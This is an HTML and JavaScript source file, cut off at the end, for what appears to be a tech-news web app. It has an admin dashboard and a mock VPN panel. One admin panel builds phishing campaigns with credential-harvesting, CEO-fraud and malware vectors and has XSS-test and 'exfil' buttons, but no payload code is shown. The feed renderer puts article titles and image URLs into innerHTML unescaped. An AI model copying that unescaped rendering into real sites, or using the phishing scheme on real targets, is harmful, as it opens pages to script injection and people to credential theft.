                              <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" /></svg>
                          </button>
                      </div>
                  </div>
                  <div id="ai-agent-log" class="mt-4 p-3 bg-black text-green-400 font-mono text-xs rounded-lg h-24 overflow-y-auto hidden"></div>
              </div>

              <!-- Security Center -->
              <div class="mt-8 pt-8 border-t border-gray-200 dark:border-gray-700">
                  <div class="flex items-center justify-between mb-4">
                      <h3 class="text-xl font-bold flex items-center gap-2 text-gray-400">
                          <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" /></svg>
                          Security Center
                      </h3>
                  </div>

                  <!-- GhostNet AI (Enterprise Edition) -->
                  <div class="bg-[#0f1115] border border-gray-800 rounded-xl p-0 mb-6 overflow-hidden shadow-2xl">
                      <!-- Header Bar -->
                      <div class="bg-[#161b22] px-6 py-4 border-b border-gray-800 flex flex-col md:flex-row justify-between items-center gap-4">
                          <div class="flex items-center gap-3">
                              <div class="bg-cyan-900/20 p-2 rounded-lg border border-cyan-900/50">
                                  <svg class="w-6 h-6 text-cyan-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" /></svg>
                              </div>
                              <div>
                                  <h4 class="text-lg font-bold text-white tracking-tight">GhostNet<span class="text-cyan-500">Enterprise</span></h4>
                                  <p class="text-[10px] text-gray-500 uppercase tracking-wider font-semibold">Network Anonymization Suite v2.4.1</p>
                              </div>
                          </div>
                          
                          <div class="flex items-center gap-6">
                              <div class="flex flex-col items-end">
                                  <span class="text-[10px] uppercase text-gray-500 font-bold mb-1">Status</span>
                                  <div class="flex items-center gap-2">
                                      <span id="ghost-status-indicator" class="w-2 h-2 rounded-full bg-red-500"></span>
                                      <span id="ghost-status-text" class="text-xs font-mono font-bold text-gray-400">DISCONNECTED</span>
                                  </div>
                              </div>
                              <button onclick="GhostNet.toggle()" id="ghost-toggle-btn" data-ui-enhance data-ui-tooltip="Toggle Encryption" data-ui-shortcut="Alt+G" data-ui-analytics-event="ghostnet_toggle" class="bg-cyan-600 hover:bg-cyan-700 text-white text-xs font-bold py-2 px-6 rounded transition-all shadow-[0_0_15px_rgba(8,145,178,0.3)]">
                                  INITIALIZE
                              </button>
                          </div>
                      </div>

                      <div class="grid grid-cols-1 lg:grid-cols-3 divide-y lg:divide-y-0 lg:divide-x divide-gray-800">
                          <!-- Configuration Column -->
                          <div class="p-6 space-y-6">
                              <div>
                                  <label class="block text-[10px] uppercase text-gray-500 font-bold mb-2">Tunnel Protocol</label>
                                  <select id="ghost-protocol" class="w-full bg-[#0a0c10] border border-gray-700 text-gray-300 text-xs rounded p-2.5 focus:border-cyan-500 focus:ring-1 focus:ring-cyan-500 outline-none transition-colors">
                                      <option value="wireguard">WireGuard (UDP) - High Speed</option>
                                      <option value="openvpn_tcp">OpenVPN (TCP) - Reliability</option>
                                      <option value="ikev2">IKEv2/IPsec - Mobile Stability</option>
                                      <option value="shadowsocks">Shadowsocks - Obfuscation</option>
                                  </select>
                              </div>
                              <div>
                                  <label class="block text-[10px] uppercase text-gray-500 font-bold mb-2">Routing Policy</label>
                                  <select id="ghost-policy" class="w-full bg-[#0a0c10] border border-gray-700 text-gray-300 text-xs rounded p-2.5 outline-none">
                                      <option value="auto">Auto-Hop (Dynamic Interval)</option>
                                      <option value="static">Static Residential (High Trust)</option>
                                      <option value="multihop">Double-Hop (Cascade)</option>
                                  </select>
                              </div>
                              <div class="pt-4 border-t border-gray-800">
                                  <div class="flex justify-between items-center mb-2">
                                      <span class="text-[10px] text-gray-400">Encryption</span>
                                      <span class="text-[10px] text-cyan-400 font-mono">AES-256-GCM</span>
                                  </div>
                                  <div class="flex justify-between items-center">
                                      <span class="text-[10px] text-gray-400">Handshake</span>
                                      <span class="text-[10px] text-cyan-400 font-mono">ECDH-P521</span>
                                  </div>
                              </div>
                          </div>

                          <!-- Visualization Column -->
                          <div class="p-6 relative bg-[#0a0c10]">
                              <div class="absolute inset-0 bg-[radial-gradient(circle_at_center,_var(--tw-gradient-stops))] from-cyan-900/10 via-transparent to-transparent"></div>
                              <div class="relative z-10 text-center space-y-6">
                                  <div class="inline-block relative">
                                      <div id="ghost-shield" class="w-24 h-24 rounded-full border-4 border-gray-800 flex items-center justify-center transition-all duration-700">
                                          <svg class="w-10 h-10 text-gray-700 transition-colors duration-500" id="ghost-shield-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" /></svg>
                                      </div>
                                      <div class="absolute -bottom-2 left-1/2 -translate-x-1/2 bg-[#161b22] px-3 py-1 rounded-full border border-gray-700 text-[10px] font-mono text-gray-400 whitespace-nowrap" id="ghost-ip-display">
                                          UNMASKED
                                      </div>
                                  </div>
                                  
                                  <div class="grid grid-cols-2 gap-4">
                                      <div class="bg-[#161b22] p-3 rounded border border-gray-800">
                                          <p class="text-[10px] text-gray-500 uppercase mb-1">Downlink</p>
                                          <p id="ghost-down" class="text-sm font-mono text-gray-300">0.00 MB/s</p>
                                      </div>
                                      <div class="bg-[#161b22] p-3 rounded border border-gray-800">
                                          <p class="text-[10px] text-gray-500 uppercase mb-1">Uplink</p>
                                          <p id="ghost-up" class="text-sm font-mono text-gray-300">0.00 MB/s</p>
                                      </div>
                                  </div>
                              </div>
                          </div>

                          <!-- Live Logs Column -->
                          <div class="p-0 flex flex-col h-full max-h-[300px]">
                              <div class="bg-[#161b22] px-4 py-2 border-b border-gray-800 flex justify-between items-center">
                                  <span class="text-[10px] font-bold text-gray-400 uppercase">System Events</span>
                                  <span class="flex h-2 w-2 relative">
                                      <span id="log-pulse" class="animate-ping absolute inline-flex h-full w-full rounded-full bg-cyan-400 opacity-0"></span>
                                      <span class="relative inline-flex rounded-full h-2 w-2 bg-gray-600" id="log-dot"></span>
                                  </span>
                              </div>
                              <div id="ghost-log" class="flex-1 overflow-y-auto p-4 space-y-2 font-mono text-[10px] bg-black">
                                  <!-- Logs go here -->
                                  <div class="text-gray-600">Waiting for initialization...</div>
                              </div>
                          </div>
                      </div>
                  </div>

                  <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                      <!-- Audit Log -->
                      <div class="bg-[#0a0a0c] p-4 rounded-xl border border-gray-800">
                          <h4 class="text-xs font-bold uppercase text-gray-500 mb-2">Audit Log</h4>
                          <div id="admin-audit-log" class="h-32 overflow-y-auto space-y-1 font-mono">
                              <!-- Populated by JS -->
                          </div>
                      </div>
                      
                      <!-- Security Settings -->
                      <div class="bg-gray-50 dark:bg-gray-800/50 p-4 rounded-xl border border-gray-200 dark:border-gray-700">
                          <h4 class="text-xs font-bold uppercase text-gray-500 mb-4">Access Controls</h4>
                          
                          <div class="flex items-center justify-between mb-4">
                              <div>
                                  <p class="font-bold text-sm">Biometric Authentication</p>
                                  <p class="text-xs text-gray-500">Require retinal scan for login</p>
                              </div>
                              <label class="relative inline-flex items-center cursor-pointer">
                                  <input type="checkbox" class="sr-only peer" onchange="toggleBiometric(this)" id="bio-toggle" />
                                  <div class="w-11 h-6 bg-gray-200 peer-focus:outline-none rounded-full peer dark:bg-gray-700 peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all dark:border-gray-600 peer-checked:bg-cyan-600"></div>
                              </label>
                          </div>
                          
                          <div class="flex items-center justify-between">
                              <div>
                                  <p class="font-bold text-sm">Password Expiry</p>
                                  <p class="text-xs text-gray-500">Force reset every 30 days</p>
                              </div>
                              <button onclick="alert('Password reset link sent to secure email.')" class="text-xs bg-gray-200 hover:bg-gray-300 px-3 py-1 rounded text-black font-bold">Reset Now</button>
                          </div>

                          <div class="flex items-center justify-between mt-4 border-t border-gray-200 dark:border-gray-700 pt-4">
                              <div>
                                  <p class="font-bold text-sm text-red-500">Emergency</p>
                                  <p class="text-xs text-gray-500">Revoke all active sessions</p>
                              </div>
                              <button onclick="AdminSecurity.revokeAll()" class="text-xs bg-red-100 hover:bg-red-200 text-red-600 px-3 py-1 rounded font-bold">Revoke All</button>
                          </div>
                      </div>
                  </div>
              </div>

              <!-- Ethical Hacking Simulations (Protected) -->
              <div id="admin-hacking-section" class="mt-8 pt-8 border-t border-gray-200 dark:border-gray-700 hidden">
                  <h3 class="text-xl font-bold mb-4 flex items-center gap-2 text-red-500">
                      <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" /></svg>
                      Ethical Hacking Simulations
                  </h3>
                  <div class="bg-red-50 dark:bg-red-900/20 p-6 rounded-xl border border-red-100 dark:border-red-800 relative overflow-hidden">
                      <!-- Role Badge -->
                      <div class="absolute top-0 right-0 bg-red-600 text-white text-[10px] font-bold px-3 py-1 rounded-bl-lg uppercase tracking-wider">
                          Super Admin Only
                      </div>
                      <div class="mb-4">
                          <h4 class="font-bold mb-1">Advanced Phishing Simulator</h4>
                          <p class="text-sm text-gray-500 dark:text-gray-400">Design sophisticated social engineering campaigns for security testing.</p>
                      </div>
                      
                      <!-- Campaign Configuration -->
                      <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-4">
                          <div>
                              <label class="block text-xs font-bold uppercase text-gray-500 mb-1">Target Organization</label>
                              <input type="text" id="phish-target" placeholder="e.g. Acme Corp" class="w-full px-3 py-2 rounded-lg border border-gray-200 dark:border-gray-700 bg-white dark:bg-gray-800 text-sm focus:ring-2 focus:ring-red-500 outline-none" />
                          </div>
                          <div>
                              <label class="block text-xs font-bold uppercase text-gray-500 mb-1">Victim Name</label>
                              <input type="text" id="phish-victim" placeholder="e.g. John Doe" class="w-full px-3 py-2 rounded-lg border border-gray-200 dark:border-gray-700 bg-white dark:bg-gray-800 text-sm focus:ring-2 focus:ring-red-500 outline-none" />
                          </div>
                          <div>
                              <label class="block text-xs font-bold uppercase text-gray-500 mb-1">Sender Alias</label>
                              <input type="text" id="phish-sender" placeholder="e.g. IT Support" class="w-full px-3 py-2 rounded-lg border border-gray-200 dark:border-gray-700 bg-white dark:bg-gray-800 text-sm focus:ring-2 focus:ring-red-500 outline-none" />
                          </div>
                      </div>

                      <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
                          <div>
                              <label class="block text-xs font-bold uppercase text-gray-500 mb-1">Attack Vector</label>
                              <select id="phish-vector" class="w-full px-3 py-2 rounded-lg border border-gray-200 dark:border-gray-700 bg-white dark:bg-gray-800 text-sm outline-none">
                                  <option value="account_suspension">Account Suspension (Credential Harvesting)</option>
                                  <option value="ceo_fraud">CEO Fraud (Wire Transfer)</option>
                                  <option value="hr_policy">HR Policy Update (Malware)</option>
                                  <option value="technical_support">Technical Support (Remote Access)</option>
                                  <option value="invoice_overdue">Overdue Invoice (Urgency)</option>
                              </select>
                          </div>
                          <div>
                              <label class="block text-xs font-bold uppercase text-gray-500 mb-1">Sophistication</label>
                              <select id="phish-level" class="w-full px-3 py-2 rounded-lg border border-gray-200 dark:border-gray-700 bg-white dark:bg-gray-800 text-sm outline-none">
                                  <option value="low">Low (Typos, Generic)</option>
                                  <option value="medium">Medium (Branded, Personalized)</option>
                                  <option value="high">High (Spear Phishing, Contextual)</option>
                              </select>
                          </div>
                          <div>
                              <label class="block text-xs font-bold uppercase text-gray-500 mb-1">Urgency</label>
                              <select id="phish-urgency" class="w-full px-3 py-2 rounded-lg border border-gray-200 dark:border-gray-700 bg-white dark:bg-gray-800 text-sm outline-none">
                                  <option value="normal">Normal (Informational)</option>
                                  <option value="high">High (Action Required Today)</option>
                                  <option value="critical">Critical (Immediate Suspension)</option>
                              </select>
                          </div>
                      </div>

                      <!-- Action Buttons -->
                      <div class="flex gap-2 mb-4">
                          <button onclick="EthicalHackingSim.generatePhish()" data-ui-enhance data-ui-loading="true" data-ui-tooltip="Generate Phish" class="bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-6 rounded-lg transition-colors flex items-center gap-2">
                              <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19.428 15.428a2 2 0 00-1.022-.547l-2.387-.477a6 6 0 00-3.86.517l-.318.158a6 6 0 01-3.86.517L6.05 15.21a2 2 0 00-1.806.547M8 4h8l-1 1v5.172a2 2 0 00.586 1.414l5 5c1.26 1.26.367 3.414-1.415 3.414H4.828c-1.782 0-2.674-2.154-1.414-3.414l5-5A2 2 0 009 10.172V5L8 4z" /></svg>
                              Generate Campaign
                          </button>
                          <button onclick="EthicalHackingSim.togglePreview()" class="bg-gray-200 dark:bg-gray-800 text-gray-700 dark:text-gray-300 font-bold py-2 px-6 rounded-lg transition-colors">
                              Toggle Preview
                          </button>
                          <button onclick="EthicalHackingSim.runXSSDemo()" data-ui-enhance data-ui-tooltip="Run Simulation" data-ui-loading="true" data-ui-confirm="Warning: This will execute a harmless XSS payload for demonstration. Proceed?" class="bg-purple-600 hover:bg-purple-700 text-white font-bold py-2 px-6 rounded-lg transition-colors flex items-center gap-2">
                              <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4" /></svg>
                              Test XSS Payload
                          </button>
                          <button onclick="EthicalHackingSim.publishToFeed()" data-ui-enhance data-ui-loading="true" data-ui-tooltip="Publish" class="bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-6 rounded-lg transition-colors flex items-center gap-2">
                              <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 11H5m14 0a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2m14 0V9a2 2 0 00-2-2M5 11V9a2 2 0 012-2m0 0V5a2 2 0 012-2h6a2 2 0 012 2v2M7 7h10" /></svg>
                              Publish to Feed
                          </button>
                      </div>

                      <!-- Output Area -->
                      <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
                          <!-- Raw Source -->
                          <div>
                              <div class="flex justify-between items-center mb-2">
                                  <label class="text-xs font-bold uppercase text-gray-500">Raw Source</label>
                                  <button onclick="navigator.clipboard.writeText(document.getElementById('phish-output').value); showToast('Copied to clipboard')" class="text-xs text-brand hover:underline">Copy</button>
                              </div>
                              <textarea id="phish-output" rows="12" class="w-full p-4 rounded-lg bg-black text-green-400 font-mono text-xs border border-gray-700 focus:border-red-500 outline-none" placeholder="Generated source code..." readonly></textarea>
                            
                            <div class="mt-4 flex gap-2">
                                <button onclick="EthicalHackingSim.testExfil()" class="w-full py-2 bg-red-900/50 hover:bg-red-900 text-red-200 border border-red-800 rounded font-mono text-xs uppercase tracking-widest transition-colors">
                                    [TEST] Run XSS Payload Simulation
                                </button>
                            </div>
                        </div>
                          
                          <!-- Visual Preview / Analysis -->
                          <div class="bg-white dark:bg-gray-900 rounded-lg border border-gray-200 dark:border-gray-700 overflow-hidden flex flex-col">
                              <div class="bg-gray-100 dark:bg-gray-800 px-4 py-2 border-b border-gray-200 dark:border-gray-700 flex justify-between items-center">
                                  <span class="text-xs font-bold uppercase text-gray-500">Email Preview</span>
                                  <div class="flex gap-1">
                                      <div class="w-2 h-2 rounded-full bg-red-500"></div>
                                      <div class="w-2 h-2 rounded-full bg-yellow-500"></div>
                                      <div class="w-2 h-2 rounded-full bg-green-500"></div>
                                  </div>
                              </div>
                              <div id="phish-preview" class="p-4 overflow-y-auto h-full text-black bg-white">
                                  <div class="text-center text-gray-400 text-sm mt-10">Generate a campaign to see preview...</div>
                              </div>
                          </div>
                      </div>
                      
                      <!-- Analysis Section -->
                      <div id="phish-analysis" class="mt-4 p-4 bg-yellow-50 dark:bg-yellow-900/20 rounded-lg border border-yellow-100 dark:border-yellow-800 hidden">
                          <h5 class="font-bold text-yellow-800 dark:text-yellow-200 mb-2 flex items-center gap-2">
                              <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
                              Attack Analysis
                          </h5>
                          <ul id="phish-analysis-list" class="list-disc list-inside text-sm text-yellow-800 dark:text-yellow-200 space-y-1"></ul>
                      </div>

                      <p class="text-xs text-gray-400 mt-4 border-t border-gray-200 dark:border-gray-700 pt-2">
                          ‚ö†Ô∏è <strong>Compliance Warning:</strong> Ensure you have written authorization from the target organization before launching any simulation. Unauthorized testing is illegal.
                      </p>
                  </div>
              </div>
          </div>
          </div> <!-- End admin-view-dashboard -->

          <!-- View: Validator -->
          <div id="admin-view-validator" class="hidden h-full">
               <div class="bg-[#0f1115] rounded-xl p-6 border border-gray-800 shadow-2xl h-full flex flex-col">
                   <div class="flex justify-between items-center mb-6">
                       <div>
                           <h3 class="text-lg font-bold text-white flex items-center gap-2">
                               <span class="w-2 h-2 rounded-full bg-cyan-500 animate-pulse"></span>
                               AI Service Validation Suite
                           </h3>
                           <p class="text-xs text-gray-400">Automated testing for inference engine integrity & compliance.</p>
                       </div>
                       <div class="flex gap-4 items-center">
                            <div class="flex flex-col items-end">
                                <span class="text-[10px] uppercase text-gray-500 font-bold">Status</span>
                                <span id="validator-status" class="text-xs font-mono font-bold text-gray-300">IDLE</span>
                            </div>
                           <button onclick="window.GuardianSDK.validateXSS()" data-ui-enhance data-ui-loading="true" data-ui-tooltip="Run XSS Scan" class="px-6 py-2 bg-red-600 hover:bg-red-500 text-white rounded font-bold text-sm flex items-center gap-2 shadow-[0_0_15px_rgba(220,38,38,0.3)] transition-all mr-2">
                               <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
                               TEST XSS DEFENSE
                           </button>
                           <button onclick="window.AIValidator.runAll()" class="px-6 py-2 bg-cyan-600 hover:bg-cyan-500 text-white rounded font-bold text-sm flex items-center gap-2 shadow-[0_0_15px_rgba(8,145,178,0.3)] transition-all">
                               <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                               RUN DIAGNOSTICS
                           </button>
                       </div>
                   </div>
                   
                   <div class="flex-1 bg-black rounded-lg border border-gray-800 p-4 overflow-y-auto font-mono text-xs space-y-1" id="validator-results">
                       <div class="h-full flex flex-col items-center justify-center text-gray-600">
                           <svg class="w-12 h-12 mb-4 opacity-20" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                           <p>System Ready. Initialize diagnostics sequence.</p>
                       </div>
                   </div>

                   <div class="mt-4 grid grid-cols-4 gap-4 text-center">
                        <div class="bg-gray-900/50 p-3 rounded border border-gray-800">
                            <p class="text-[10px] uppercase text-gray-500 font-bold">Tests Run</p>
                            <p id="val-stat-total" class="text-xl font-bold text-white">0</p>
                        </div>
                        <div class="bg-green-900/20 p-3 rounded border border-green-900/30">
                            <p class="text-[10px] uppercase text-green-500 font-bold">Passed</p>
                            <p id="val-stat-passed" class="text-xl font-bold text-green-400">0</p>
                        </div>
                        <div class="bg-red-900/20 p-3 rounded border border-red-900/30">
                            <p class="text-[10px] uppercase text-red-500 font-bold">Failed</p>
                            <p id="val-stat-failed" class="text-xl font-bold text-red-400">0</p>
                        </div>
                        <div class="bg-blue-900/20 p-3 rounded border border-blue-900/30">
                            <p class="text-[10px] uppercase text-blue-500 font-bold">Duration</p>
                            <p id="val-stat-duration" class="text-xl font-bold text-blue-400">0ms</p>
                        </div>
                   </div>
               </div>
          </div>
      </div>
  </div>

  <!-- Article Modal (Create/Edit) -->
  <div id="modal-backdrop" class="fixed inset-0 bg-black/80 backdrop-blur-sm z-[60] hidden flex items-center justify-center opacity-0 transition-opacity duration-300">
    <div id="modal-content" class="bg-white dark:bg-[#1a1a1d] w-full max-w-2xl max-h-[90vh] overflow-y-auto rounded-2xl shadow-2xl transform scale-95 transition-transform duration-300 m-4">
      <div class="sticky top-0 bg-white dark:bg-[#1a1a1d] px-6 py-4 border-b border-gray-200 dark:border-gray-700 flex items-center justify-between z-10">
        <h3 class="text-xl font-black" id="modal-title">New Story</h3>
        <button onclick="closeModal()" data-ui-enhance data-ui-tooltip="Close" data-ui-shortcut="Escape" class="p-2 hover:bg-gray-100 dark:hover:bg-gray-800 rounded-full transition-colors"><svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" /></svg></button>
      </div>
      <div class="p-6 space-y-6">
        <input type="hidden" id="article-id" />
        <div>
          <label class="block text-sm font-bold mb-2">Title</label>
          <input type="text" id="article-title" class="w-full px-4 py-3 bg-gray-50 dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-lg focus:ring-2 focus:ring-brand outline-none transition-all" placeholder="Enter a catchy headline" />
        </div>
        <div class="grid grid-cols-2 gap-4">
           <div>
             <label class="block text-sm font-bold mb-2">Category</label>
             <select id="article-category" class="w-full px-4 py-3 bg-gray-50 dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-lg outline-none">
               <option>Startups</option><option>AI</option><option>Crypto</option><option>Venture</option><option>Security</option>
             </select>
           </div>
           <div>
             <label class="block text-sm font-bold mb-2">Image URL</label>
             <input type="text" id="article-image" class="w-full px-4 py-3 bg-gray-50 dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-lg outline-none" placeholder="https://..." />
           </div>
        </div>
        <div>
           <label class="block text-sm font-bold mb-2">Excerpt</label>
           <textarea id="article-excerpt" rows="2" class="w-full px-4 py-3 bg-gray-50 dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-lg outline-none" placeholder="Short summary..."></textarea>
           <button type="button" onclick="generateAISummary(this)" data-ui-enhance data-ui-loading="true" data-ui-tooltip="Auto-Summarize" class="mt-2 text-xs font-bold text-brand hover:text-white hover:bg-brand px-3 py-1 rounded border border-brand transition-colors">‚ú® Generate with AI</button>
        </div>
        <div>
           <label class="block text-sm font-bold mb-2">Content (HTML supported)</label>
           <textarea id="article-content" rows="8" class="w-full px-4 py-3 bg-gray-50 dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-lg outline-none font-mono text-sm" placeholder="<p>Article content...</p>"></textarea>
        </div>
      </div>
      <div class="sticky bottom-0 bg-white dark:bg-[#1a1a1d] px-6 py-4 border-t border-gray-200 dark:border-gray-700 flex justify-end gap-3">
        <button onclick="closeModal()" class="px-6 py-2 font-bold text-gray-500 hover:text-gray-900 dark:hover:text-white transition-colors">Cancel</button>
        <button onclick="saveArticle()" data-ui-enhance data-ui-loading="true" data-ui-tooltip="Publish Story" class="px-6 py-2 bg-brand text-black font-bold rounded-lg hover:opacity-90 shadow-lg shadow-cyan-500/20 transition-all">Publish Story</button>
      </div>
    </div>
  </div>

  <script src="_sdk/guardian_ml.js"></script>
  <script src="_sdk/wasm_loader.js"></script>
  <!-- SDKs moved to head -->
  <script>
    // --- APP STATE ---
    let currentArticleId = null;

    // --- INITIALIZATION ---
    document.addEventListener('DOMContentLoaded', async () => {
        initDarkMode();
        GuardianSDK.init();
        
        // Initialize Data SDK
        await dataSdk.init({
            onDataChanged: (data) => {
                // If we are on home view, refresh it.
                if (!location.hash) renderHome(data);
            },
            onCollectionChanged: (collection, data) => {
                // Handle granular updates if needed
            }
        });

        // Initialize Seeding
        if (typeof SeedData !== 'undefined') {
            await SeedData.init();
        }

        // Setup Router
        window.addEventListener('hashchange', handleRoute);
        
        // Initialize AI Tracker
        BehaviorTracker.init();
        
        handleRoute(); // Initial route
        
        // Setup Ticker
        updateTicker();
    });

    // --- ROUTER ---
    async function handleRoute() {
        try {
            // Track View
            BehaviorTracker.trackPageView();

            const hash = window.location.hash;
            const main = document.querySelector('main');
            
            // Hide all views
            document.querySelectorAll('.view-section').forEach(el => el.classList.add('hidden'));
            window.scrollTo(0, 0);

            if (!hash || hash === '#') {
                document.getElementById('view-home').classList.remove('hidden');
                const articles = await dataSdk.getArticles();
                renderHome(articles);
            } else if (hash.startsWith('#article/')) {
                const id = hash.split('/')[1];
                document.getElementById('view-article').classList.remove('hidden');
                await renderArticleDetail(id);
            } else if (hash.startsWith('#author/')) {
                const id = hash.split('/')[1];
                document.getElementById('view-author').classList.remove('hidden');
                await renderAuthorDetail(id);
            } else if (hash.startsWith('#category/')) {
                const cat = hash.split('/')[1];
                document.getElementById('view-category').classList.remove('hidden');
                await renderCategory(cat);
            } else if (hash === '#market') {
                document.getElementById('view-market').classList.remove('hidden');
                await renderMarket();
            } else if (hash === '#events') {
                document.getElementById('view-events').classList.remove('hidden');
                await renderEvents();
            }
        } catch (error) {
            console.error('Routing Error:', error);
            showToast('Failed to load content. Returning home.', 'error');
            setTimeout(() => window.location.hash = '#', 2000);
        }
    }

    // --- DARK MODE ---
    function initDarkMode() {
        if (localStorage.theme === 'dark' || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
            document.documentElement.classList.add('dark');
            updateDarkIcon(true);
        } else {
            document.documentElement.classList.remove('dark');
            updateDarkIcon(false);
        }
    }

    function toggleDarkMode() {
        if (document.documentElement.classList.contains('dark')) {
            document.documentElement.classList.remove('dark');
            localStorage.theme = 'light';
            updateDarkIcon(false);
        } else {
            document.documentElement.classList.add('dark');
            localStorage.theme = 'dark';
            updateDarkIcon(true);
        }
    }

    function updateDarkIcon(isDark) {
        if (isDark) {
            document.getElementById('moon-icon').classList.add('hidden');
            document.getElementById('sun-icon').classList.remove('hidden');
        } else {
            document.getElementById('moon-icon').classList.remove('hidden');
            document.getElementById('sun-icon').classList.add('hidden');
        }
    }

    // --- VIEW RENDERERS ---

    // 1. HOME
    async function renderHome(articles) {
        const container = document.getElementById('articles-container');
        const emptyState = document.getElementById('empty-state');
        const totalCount = document.getElementById('total-count');
        
        if (!articles) {
            console.error('renderHome called with null/undefined articles');
            articles = [];
        }

        totalCount.innerText = articles.length;

        // Render Hero and Sidebar Widgets
        if (articles.length > 0) {
            renderHomeHero(articles[0]);
        }
        renderHomeMarketWidget();

        // AI PREDICTION FEED
        try {
            const predictions = await UserInsightEngine.getPredictions();
            const aiSection = document.getElementById('ai-feed-section');
            
            if (predictions.length > 0) {
                if (!aiSection) {
                    const section = document.createElement('div');
                    section.id = 'ai-feed-section';
                    section.className = 'mb-12';
                    section.innerHTML = `
                        <div class="flex items-center gap-2 mb-6">
                            <span class="w-3 h-3 rounded-full bg-brand animate-pulse"></span>
                            <h2 class="text-2xl font-black bg-gradient-to-r from-brand to-purple-600 bg-clip-text text-transparent">AI Suggested for You</h2>
                        </div>
                        <div class="grid grid-cols-1 md:grid-cols-3 gap-6" id="ai-feed-grid"></div>
                    `;
                    container.before(section);
                }
                
                document.getElementById('ai-feed-grid').innerHTML = predictions.map(article => `
                    <div class="bg-gray-900 text-white rounded-xl overflow-hidden relative group cursor-pointer border border-gray-800" onclick="location.hash='#article/${article.id}'">
                        <img loading="lazy" src="${article.image}" class="w-full h-48 object-cover opacity-60 group-hover:opacity-40 transition-opacity" />
                        <div class="absolute inset-0 p-6 flex flex-col justify-end bg-gradient-to-t from-black/90 to-transparent">
                            <span class="text-xs font-bold text-brand mb-2">98% Match</span>
                            <h3 class="font-bold text-lg leading-tight group-hover:underline">${article.title}</h3>
                        </div>
                    </div>
                `).join('');
            }
        } catch (error) {
            console.warn('AI Predictions failed:', error);
            // Gracefully degrade - just don't show the AI section
        }

        if (articles.length === 0) {
            container.innerHTML = '';
            emptyState.classList.remove('hidden');
            return;
        }

        emptyState.classList.add('hidden');
        
        // Skip first article for feed if hero is active
        const feedArticles = articles.length > 0 ? articles.slice(1) : [];

        // TechCrunch Style: Single Column River
